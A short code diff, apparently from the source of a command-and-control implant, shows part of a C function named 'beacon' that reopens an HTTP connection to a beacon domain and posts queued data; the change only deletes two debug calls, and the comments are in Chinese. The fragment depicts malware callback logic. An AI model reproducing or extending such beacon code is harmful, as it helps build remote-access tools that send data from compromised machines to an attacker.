@@ -218,14 +218,12 @@ void beacon(LPVOID lpReserved) {
 
 			/* 如果有任何内容要发送，现在就执行--一次性操作 */
 			if (http_post_len > 0) {
-				x86_bc("before post_maybe");
 				/* 使用新的HTTP连接--反正Web服务器会关闭连接 */
 				http_close();
 				http_init(beacon_domain, port, ua);
 
 				/* 好，现在发送我们的数据 */
 				http_post_maybe(post_url);
-				x86_bc("after post_maybe");
 			}
 		}
 		else {
